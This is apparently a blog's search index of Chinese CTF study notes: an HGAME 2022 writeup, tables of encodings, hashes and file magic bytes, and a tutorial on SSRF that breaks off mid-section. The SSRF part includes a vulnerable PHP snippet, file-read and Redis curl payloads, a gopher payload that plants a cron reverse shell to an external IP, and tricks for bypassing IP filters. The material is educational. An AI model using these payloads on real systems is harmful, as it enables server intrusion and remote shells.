<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HGAME 2022 Official Writeup</title>
      <link href="/2022/01/29/HGAME%202022%20Official%20Writeup/"/>
      <url>/2022/01/29/HGAME%202022%20Official%20Writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[toc]</p><h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a><strong><em>Week</em> 1</strong></h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><em>Web</em></h2><h3 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h3><blockquote><p>考点：JavaScript代码审计</p><p>描述：据说没人能超过 3000 分。要是做题做累了，就来玩玩小游戏吧(x</p><p><a href="https://hgame-spider.vidar.club/a6d9de279d">https://hgame-spider.vidar.club/a6d9de279d</a></p></blockquote><p>打开源代码，相关代码在<code>checking.js</code>里 </p><img src="/2022/01/29/HGAME%202022%20Official%20Writeup/image-20220129230603013.png" style="zoom: 33%;"><p>拖到底能看到一行注释掉的代码，这段代码是经过 <code>jsfuck</code> 编码的，复制出来在浏览器控制台里执行一下就能看到flag了，或者网上找个<code>jsfuck</code>解码工具跑一下</p><img src="/2022/01/29/HGAME%202022%20Official%20Writeup/image-20220129231409655.png" style="zoom:33%;"><p>复制此代码到控制台</p><img src="/2022/01/29/HGAME%202022%20Official%20Writeup/image-20220129231612888.png" style="zoom:20%;"><h3 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h3><blockquote><p>考点：HTTP 基本知识</p><p>描述：昨晚我输给一辆AE86。他用惯性漂移过弯，他的车很快，我只看到他有个豆腐店的招牌 </p><p><a href="http://shop.summ3r.top/">http://shop.summ3r.top</a></p></blockquote><img src="/2022/01/29/HGAME%202022%20Official%20Writeup/image-20220216140952710.png" style="zoom:25%;"><p>解题步骤（点击下面的请求头可查看文档: </p><ol><li>referer 设为 qiumingshan.net </li><li>user-agent 设为 Hachi-Roku </li><li>Cookie 里的 flavor 属性设置为 Raspberry。返回头的 Set-Cookie是提示（图中标号2）。</li><li>Gasoline 设为 100,这里的 Gasoline 是一个自定义的 HTTP 头，标准里没有的，返回头里的 Gasoline: 0 给了大家提示了2333（图中标号1）。</li><li>伪造本地 ip,让后端认为请求就是从服务器本身发出的。一般想到伪造 IP 大家都会用 X-Forwarded-For， 这里我故意禁用了，然后好多人就卡住了，效果拔群2333。这里正确的做法应该是设置 X-Real-IP 为 127.0.0.1 。IP 伪造和代理服务器有关，相关的请求头有 X-Forworded-For , X-Real-IP , X-Client-IP 等，至于那个请求头能成功伪造 IP，得参考具体的网络环境，编程语言，服务端框架和服务端配置。返回头里给出了后端框架： gin-gonic/gin ，预期解法是让大家去查一查gin是怎样处理这些请求头的，不过好像没人去查www。(<a href="https://github.com/gin-gonic/gin/issues/1684">https://github.com/gin-gonic/gin/issues/1684</a>)</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF线上赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF线上赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto(二)</title>
      <link href="/2022/01/18/Crypto(%E4%BA%8C)/"/>
      <url>/2022/01/18/Crypto(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="2-MD5"><a href="#2-MD5" class="headerlink" title="2.MD5"></a>2.MD5</h2><p>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，字母大小写统一。16位值是取的是8~24位。</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.123456</span><br><span class="line">md5(hello，world.123456,32) = 5189503aae1b1c0a6fbf7ea9e3128ab0</span><br><span class="line">md5(hello，world.123456,16) = ae1b1c0a6fbf7ea9</span><br></pre></td></tr></table></figure><p><a href="http://www.ttmd5.com/">md5解密1</a></p><p><a href="https://www.cmd5.com/">md5解密2</a></p><h2 id="3-SHA-1"><a href="#3-SHA-1" class="headerlink" title="3.SHA 1"></a>3.SHA 1</h2><p> SHA1是一种密码散列函数，SHA1可以生成一个被称为消息摘要的160位，20字节的散列值，散列值通常的呈现形式为<strong>40位十六进制数</strong>。这种加密和MD5类似。</p><p> <strong>特征：</strong> 有固定长度，为40位的字符串</p><p><strong>举例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.123456</span><br><span class="line">sha1（hello，world.123456）= 0179303b8f08fbc3d16cd23a4be5828790e12375</span><br></pre></td></tr></table></figure><p><a href="http://www.ttmd5.com/hash.php?type=5">sha1在线解密</a></p><h2 id="4-Unicode编码"><a href="#4-Unicode编码" class="headerlink" title="4.Unicode编码"></a>4.Unicode编码</h2><p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。<br>它用两个字节来编码一个字符,字符编码一般用十六进制来表示.</p><p> <strong>举例：</strong></p><p>Unicode有以下四种编码方式：</p><blockquote><p>明文：hello，world.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x [hex]：&amp;#x0068;&amp;#x0065;&amp;#x006C;&amp;#x006C;&amp;#x006F;&amp;#xFF0C;&amp;#x0077;&amp;#x006F;&amp;#x0072;&amp;#x006C;&amp;#x0064;&amp;#x002E;</span><br><span class="line"></span><br><span class="line">&amp;# [hex]：&amp;#00104;&amp;#00101;&amp;#00108;&amp;#00108;&amp;#00111;&amp;#65292;&amp;#00119;&amp;#00111;&amp;#00114;&amp;#00108;&amp;#00100;&amp;#00046;</span><br><span class="line"></span><br><span class="line">\u [hex]：\U0068\U0065\U006C\U006C\U006F\U002C\U0077\U006F\U0072\U006C\U0064\U002E</span><br><span class="line"></span><br><span class="line">\u+ [hex]：\U+0068\U+0065\U+006C\U+006C\U+006F\U+FF0C\U+0077\U+006F\U+0072\U+006C\U+0064\U+002E</span><br></pre></td></tr></table></figure><p><a href="http://www.mxcz.net/tools/Unicode.aspx">Unicode在线 </a></p><h2 id="5-HTML实体编码"><a href="#5-HTML实体编码" class="headerlink" title="5.HTML实体编码"></a>5.HTML实体编码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.</span><br><span class="line">十进制：&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;&amp;#65292;&amp;#119;&amp;#111;&amp;#114;&amp;#108;&amp;#100;&amp;#46;</span><br><span class="line">十六进制：&amp;#x68;&amp;#x65;&amp;#x6C;&amp;#x6C;&amp;#x6F;&amp;#xFF0C;&amp;#x77;&amp;#x6F;&amp;#x72;&amp;#x6C;&amp;#x64;&amp;#x2E;</span><br></pre></td></tr></table></figure><p><a href="https://www.toolzl.com/tools/htmlende.html">HTML实体编码互转</a></p><h2 id="6-URL编码"><a href="#6-URL编码" class="headerlink" title="6.URL编码"></a>6.URL编码</h2><p>编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><p>编码前面都有%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world</span><br><span class="line">%68%65%6c%6c%6f%a3%ac%77%6f%72%6c%64%2e</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charseturlencode">在线URL</a></p><h2 id="7-Hex编码"><a href="#7-Hex编码" class="headerlink" title="7.Hex编码"></a>7.Hex编码</h2><p>十六进制（Hexadecimal）</p><p>它是计算机中数据的一种表示方法，<strong>由0-9，A-F组 成，字母不区分大小写</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.</span><br><span class="line">密文（带%）：%68%65%6c%6c%6f%ef%bc%8c%77%6f%72%6c%64%2e</span><br><span class="line">密文（不带%）：68656C6C6FEFBC8C776F726C642E</span><br></pre></td></tr></table></figure><p><a href="https://www.107000.com/T-Hex">不带%</a></p><p><a href="http://stool.chinaz.com/hex">带%</a></p><h2 id="8-Jother编码"><a href="#8-Jother编码" class="headerlink" title="8.Jother编码"></a>8.Jother编码</h2><p>只用 **! + ( ) [ ] { } **这八个字符就能完成对任意字符串的编码。可在F12中解密执行</p><img src="/2022/01/18/Crypto(%E4%BA%8C)/image-20220119172909513.png" alt="Jother编码" style="zoom:25%;"><h2 id="9-JSFuck"><a href="#9-JSFuck" class="headerlink" title="9.JSFuck"></a>9.JSFuck</h2><p><strong>与jother很像，只是少了{ }</strong></p><p><a href="http://www.jsfuck.com/">JSFuck </a></p><p>解密在F12的console中</p><h2 id="10-Quoted-printable编码"><a href="#10-Quoted-printable编码" class="headerlink" title="10.Quoted-printable编码"></a>10.Quoted-printable编码</h2><p>任何一个8位的字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：天上掉下了个猪八戒</span><br><span class="line">密文：=E5=A4=A9=E4=B8=8A=E6=8E=89=E4=B8=8B=E4=BA=86=E4=B8=AA=E7=8C=AA=E5=85=AB=E6=88=92</span><br></pre></td></tr></table></figure><p><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx"> Quoted-Printable</a></p><p><a href="https://dencode.com/string/quoted-printable">Quoted-printable Encoder / Decoder Online - DenCode</a></p><h2 id="11-XXencode"><a href="#11-XXencode" class="headerlink" title="11.XXencode"></a>11.XXencode</h2><p>字符范围是：<strong>0-9，A-Z，a-z</strong>，</p><p> 一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.</span><br><span class="line">密文：BO4JgP4yXf5RjQalY9U++</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charsetxxencode">XXencode加解密</a></p><h2 id="12-UUencode"><a href="#12-UUencode" class="headerlink" title="12.UUencode"></a>12.UUencode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.</span><br><span class="line">密文：,:&amp;5L;&amp;\L=V]R;&amp;0N</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charsetuuencode">在线UUencode</a></p><p><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">Uuencode</a></p><h2 id="13-brainfuck"><a href="#13-brainfuck" class="headerlink" title="13.brainfuck"></a>13.brainfuck</h2><p>BrainFuck 语言只有八种符号，所有的操作都由这八种符号 <strong>(&gt; &lt; + - . , [ ])</strong> 的组合来完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.</span><br><span class="line">密文：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ ++[-&gt;</span><br><span class="line">----- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ ++++. ----- ---.+</span><br><span class="line">++.-- ----. ----- ---.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- .&lt;</span><br></pre></td></tr></table></figure><p><a href="https://www.splitbrain.org/services/ook">Brainfuck</a></p><p><a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript">Brainfuck interpreter</a></p><h2 id="14-与佛论禅"><a href="#14-与佛论禅" class="headerlink" title="14.与佛论禅"></a>14.与佛论禅</h2><p>密文以”佛曰：如是我闻：”开头，密文一般是与关佛经的汉字</p><p><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p><h2 id="15-摩斯密码"><a href="#15-摩斯密码" class="headerlink" title="15.摩斯密码"></a>15.摩斯密码</h2><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用 <code>/</code> 划分）</li><li>以及句子之间长的停顿</li></ol><p>莫尔斯电码对应表：</p><table><thead><tr><th align="left">A <strong>.-</strong></th><th align="left">B <strong>-…</strong></th><th align="left">C <strong>-.-.</strong></th><th align="left">D <strong>-..</strong></th><th align="left">E <strong>.</strong></th><th align="left">F <strong>..-.</strong></th><th align="left">G <strong>–.</strong></th><th align="left">H <strong>….</strong></th><th align="left">I <strong>..</strong></th><th align="left">J <strong>.—</strong></th></tr></thead><tbody><tr><td align="left">K <strong>-.-</strong></td><td align="left">L <strong>.-..</strong></td><td align="left">M <strong>–</strong></td><td align="left">N <strong>-.</strong></td><td align="left">O <strong>—</strong></td><td align="left">P <strong>.–.</strong></td><td align="left">Q <strong>–.-</strong></td><td align="left">R <strong>.-.</strong></td><td align="left">S <strong>…</strong></td><td align="left">T <strong>-</strong></td></tr><tr><td align="left">U <strong>..-</strong></td><td align="left">V <strong>…-</strong></td><td align="left">W <strong>.–</strong></td><td align="left">X <strong>-..-</strong></td><td align="left">Y <strong>-.–</strong></td><td align="left">Z <strong>–..</strong></td><td align="left">0 <strong>—–</strong></td><td align="left">1 <strong>.—-</strong></td><td align="left">2 <strong>..—</strong></td><td align="left">3 <strong>…–</strong></td></tr><tr><td align="left">4 <strong>….-</strong></td><td align="left">5 <strong>…..</strong></td><td align="left">6 <strong>-….</strong></td><td align="left">7 <strong>–…</strong></td><td align="left">8 <strong>—..</strong></td><td align="left">9 <strong>—-.</strong></td><td align="left">. <strong>.-.-.-</strong></td><td align="left">, <strong>–..–</strong></td><td align="left">? <strong>..–..</strong></td><td align="left">- <strong>-….-</strong></td></tr><tr><td align="left">= <strong>-…-</strong></td><td align="left">: <strong>—…</strong></td><td align="left">; <strong>-.-.-.</strong></td><td align="left">( <strong>-.–.</strong></td><td align="left">) <strong>-.–.-</strong></td><td align="left">/ <strong>-..-.</strong></td><td align="left">“ <strong>.-..-.</strong></td><td align="left">$ <strong>…-..-</strong></td><td align="left">‘ <strong>.—-.</strong></td><td align="left">¶ <strong>.-.-..</strong></td></tr><tr><td align="left">_ <strong>..–.-</strong></td><td align="left">@ <strong>.–.-.</strong></td><td align="left">! <strong>—.</strong></td><td align="left">! <strong>-.-.–</strong></td><td align="left">+ <strong>.-.-.</strong></td><td align="left">~ <strong>.-…</strong></td><td align="left"># <strong>…-.-</strong></td><td align="left">&amp; <strong>. …</strong></td><td align="left">⁄ <strong>-..-.</strong></td><td align="left"></td></tr></tbody></table><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">摩斯电码</a></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto(一)</title>
      <link href="/2022/01/17/Crypto(%E4%B8%80)/"/>
      <url>/2022/01/17/Crypto(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Base系列编码"><a href="#1-Base系列编码" class="headerlink" title="1.Base系列编码"></a>1.Base系列编码</h2><h3 id="Base-16"><a href="#Base-16" class="headerlink" title="Base 16"></a>Base 16</h3><p>使用16个ASCII可打印字符<strong>（数字0-9和字母A-F）</strong>，对任意字节数据进行编码。</p><p>先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。</p><img src="/2022/01/17/Crypto(%E4%B8%80)/image-20220118110059544.png" style="zoom:25%;"><h3 id="Base-32"><a href="#Base-32" class="headerlink" title="Base 32"></a>Base 32</h3><p>Base32编码是使用32个可打印字符<strong>（字母A-Z和数字2-7）</strong>对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符。“=”符号用作后缀填充。</p><p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p><img src="/2022/01/17/Crypto(%E4%B8%80)/image-20220118110204305.png" style="zoom:25%;"><h3 id="Base-36"><a href="#Base-36" class="headerlink" title="Base 36"></a>Base 36</h3><p>Base36是一个二进制到文本编码表示方案的二进制数据以ASCII通过将其转化为一个字符串格式基数 -36表示。以**(0-9、A-Z)**表示数字。</p><p>有符号的32位和64位整数分别最多只能容纳6个或13个base-36位数字（许多base-36位数字可能会使32位和64位整数溢出）。</p><p>例如，在base-36中，“ 922337203685477575807 ” 的64位带符号整数最大值为“ 1Y2P0IJ32E8E7 ”。类似地，在base-36中，“ 2147483647 ” 的32位带符号整数最大值为“ ZIK0ZJ ”。</p><h3 id="Base-58"><a href="#Base-58" class="headerlink" title="Base 58"></a>Base 58</h3><p>相比Base64，<strong>Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/“符号</strong>。</p><img src="/2022/01/17/Crypto(%E4%B8%80)/image-20220118155613582.png" style="zoom:25%;"><h3 id="Base-64"><a href="#Base-64" class="headerlink" title="Base 64"></a>Base 64</h3><p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。</p><p>在Base64中的可打印字符包括<strong>字母A-Z、a-z、数字0-9</strong>，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法。“=”符号用作后缀填充。</p><img src="/2022/01/17/Crypto(%E4%B8%80)/image-20220118110602272.png" style="zoom: 25%;"><p>当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；</p><p>如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p><p>参考下表：<img src="/2022/01/17/Crypto(%E4%B8%80)/image-20220118110830131.png" style="zoom:25%;"></p><h3 id="Base-85"><a href="#Base-85" class="headerlink" title="Base 85"></a>Base 85</h3><img src="/2022/01/17/Crypto(%E4%B8%80)/image-20220118111126810.png" style="zoom:25%;"><h3 id="Base-91"><a href="#Base-91" class="headerlink" title="Base 91"></a>Base 91</h3><p>base91的密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()+,./:;&lt;=&gt;?@[]^_`{|}~”）组成</p><h3 id="Base-100"><a href="#Base-100" class="headerlink" title="Base 100"></a>Base 100</h3><p>可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p><p>举例：</p><blockquote><p>明文：hello，world.123456</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base16: 68656C6C6F2C776F726C642E313233343635</span><br><span class="line">特征：大写字母(A-Z)和数字(0-9)，不用‘=’补齐。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base32: NBSWY3DPFR3W64TMMQXDCMRTGQ3DK===</span><br><span class="line">特征：大写字母(A-Z)和数字(2-7)，不满5的倍数，用‘=’补齐。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64: aGVsbG8sd29ybGQuMTIzNDY1</span><br><span class="line">特征：大小写字母（A-Z，a-z）和数字（0-9）以及特殊字符‘+’，‘/’，不满3的倍数，用‘=’补齐。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base58: 2smDFYXWKE8vc8XA8dadEYcSqcQb</span><br><span class="line">特征：相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+&quot;和&quot;/&quot;符号，最主要的是后面不会出现&#x27;=&#x27;。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base85: BOu!rDst&gt;tGAhM&lt;A1fSl1GgsI</span><br><span class="line">特征：特点是奇怪的字符比较多，但是很难出现等号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.123456</span><br><span class="line">base91: TPwJh&gt;go2Tv!_,aRA2IbLmA</span><br><span class="line">特征：由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;~”）组成</span><br><span class="line">不支持中文。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base100: 👟👜👣👣👦📦💳💃👮👦👩👣👛🐥🐨🐩🐪🐫🐬🐭</span><br><span class="line">特征：就是一堆Emoji表情</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc(一)</title>
      <link href="/2022/01/16/Misc(%E4%B8%80)/"/>
      <url>/2022/01/16/Misc(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-常见的文件头-尾"><a href="#1-常见的文件头-尾" class="headerlink" title="1.常见的文件头/尾"></a>1.常见的文件头/尾</h2><table><thead><tr><th>文件类型</th><th align="left">文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>jpg</td><td align="left">FF D8 FF E1</td><td>FF D9</td></tr><tr><td>png</td><td align="left">89 50 4E 47</td><td>AE 42 60 82</td></tr><tr><td>gif</td><td align="left">47 49 46 38</td><td>00 3B</td></tr><tr><td>bmp</td><td align="left">42 4D C0 01</td><td></td></tr><tr><td>zip</td><td align="left">50 4B 03 04</td><td>50 4B</td></tr><tr><td>rar</td><td align="left">52 61 72 21</td><td>C4 3D 7B 00 40 07 00</td></tr><tr><td>pdf</td><td align="left">25 50 44 46 2D 31 2E</td><td></td></tr><tr><td>pcap</td><td align="left">4D 3C 2B 1A</td><td></td></tr></tbody></table><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SSRF</title>
      <link href="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/"/>
      <url>/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><p>比如，一个正常的Web应用本应该从指定URL获取网页文本内容或 加载指定地址的图片，而攻击者利用漏洞伪造服务器端发起请求，从而突破了客户端获取不到数据的限制，如内网资源、服务器本地资源等。 </p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码使用file_get_contents函数从用户指定的URL获取图片并展示给用户。此时如果攻击者提交如下Payload，就可以获取到内网主机HTTP服务8000端口的开放情况（<a href="http://example.com/ssrf.php">http://example.com/ssrf.php</a>? url=<a href="http://192.168.252.1:8000/">http://192.168.252.1:8000/</a> )。 图1-1所示的就是一个SSRF攻击的示例<img src="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/image-20220111155352210.png" alt="1-1示例" style="zoom: 25%;"></p><h2 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p><p>file协议： 只能读取当前被攻击机的文件，内网机器文件不能读取</p><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>http/s协议：探测内网主机存活</p><hr><p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol (操作Redis)</span><br><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line"># file protocol (任意文件读取)</span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"># gopher protocol (一键反弹Bash)</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure><h2 id="3-相关危险函数"><a href="#3-相关危险函数" class="headerlink" title="3.相关危险函数"></a>3.相关危险函数</h2><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 <code>file_get_contents()</code> / <code>fsockopen()</code> / <code>curl_exec()</code> 等。</p><h2 id="4-过滤绕过"><a href="#4-过滤绕过" class="headerlink" title="4.过滤绕过"></a>4.过滤绕过</h2><h3 id="4-1-更改ip地址"><a href="#4-1-更改ip地址" class="headerlink" title="4.1 更改ip地址"></a>4.1 更改ip地址</h3><p>例如192.168.0.1这个IP地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xC0A80001</li><li>合并后两位：1.1.278 / 1.1.755</li><li>合并后三位：1.278 / 1.755 / 3.14159267</li></ul><h3 id="4-2-使用解析到内网的域名"><a href="#4-2-使用解析到内网的域名" class="headerlink" title="4.2  使用解析到内网的域名"></a>4.2  使用解析到内网的域名</h3><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p><p><code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。</p><h3 id="4-3-利用跳转"><a href="#4-3-利用跳转" class="headerlink" title="4.3 利用跳转"></a>4.3 